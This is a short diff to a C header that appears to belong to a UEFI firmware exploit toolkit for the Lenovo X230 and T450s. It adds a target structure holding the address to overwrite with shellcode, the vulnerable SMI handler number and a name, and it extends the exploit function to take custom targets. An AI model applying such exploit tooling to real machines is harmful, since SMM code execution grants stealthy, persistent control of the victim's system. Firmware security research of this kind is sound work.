@@ -2,5 +2,26 @@
 #define UEFI_EXPL_LENOVO_TARGET_X230     0
 #define UEFI_EXPL_LENOVO_TARGET_T450s    1
 
-bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER handler, void *context);
+typedef struct _UEFI_EXPL_TARGET
+{
+    /*
+        Target address to overwrite (EFI_BOOT_SERVICES->LocateService field value)
+        with shellcode address.
+    */
+    unsigned long long addr;
+
+    /*
+        Number of vulnerable SMI handler.
+    */
+    int smi_num;
+
+    /*
+        Target name and description.
+    */
+    const char *name;
+
+} UEFI_EXPL_TARGET,
+*PUEFI_EXPL_TARGET;
+
+bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_target, UEFI_EXPL_SMM_HANDLER handler, void *context);
 void expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info(void);
